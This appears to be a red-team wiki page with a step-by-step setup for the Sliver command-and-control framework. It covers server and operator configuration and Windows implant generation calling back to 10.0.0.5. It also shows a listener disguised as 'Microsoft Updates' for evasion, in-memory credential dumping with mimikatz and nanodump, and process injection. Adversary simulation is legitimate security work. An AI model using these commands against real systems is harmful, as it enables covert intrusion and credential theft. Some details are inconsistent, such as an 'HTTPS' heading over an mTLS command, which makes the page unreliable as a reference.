---
layout: page
title: Sliver C2 Configuration
subtitle: Advanced Go-based Command and Control setup
permalink: /redteam/c2-frameworks/sliver/
---

## Sliver C2 Infrastructure

Sliver is an open-source, cross-platform adversary simulation tool developed by Bishop Fox. Built in Go, it features secure communications, dynamic implant generation, and a collaborative multi-user console.

### Installation & Server Configuration

We host the Sliver server on an isolated Ubuntu VPS. To manage multi-user access, we generate client profiles:

```bash
# Start server in daemon mode
sliver-server daemon

# Generate client config for operator
sliver-server operator --name operator58 --lhost 10.0.0.5 -save operator58.cfg
```

Operators import `operator58.cfg` into their local client console:

```bash
sliver -config operator58.cfg
```

---

## Implant Generation & Evasion

Sliver implants support standard dynamic compilation. To evade signatures, we use custom compile-time flags and symbol obfuscation.

### Generating a HTTPS Beacon Implant

```bash
# Generate HTTPS implant with custom parameters
generate --mtls 10.0.0.5:8888 --os windows --arch amd64 --format exe --save /tmp/beacon.exe
```

For advanced evasion, we configure **mTLS** or **HTTPS** listeners with customized profiles matching standard web applications:

```bash
# Start listener with custom HTTP headers mimicking Microsoft updates
https --lport 8443 --website-name "Microsoft Updates"
```

---

## Post-Exploitation Capabilities

Sliver provides rich in-memory post-exploitation tools:

*   **Extensions**: Integrate standard tools like `nanodump`, `mimikatz`, or `sharpseclist` directly in memory without touch-to-disk.
*   **Armory**: Automatically retrieve and build extensions:
    ```bash
    armory install nanodump
    ```
*   **Process Injection**: Inject shellcode or DLLs into remote processes:
    ```bash
    sliver > migrate --pid 1048
    ```
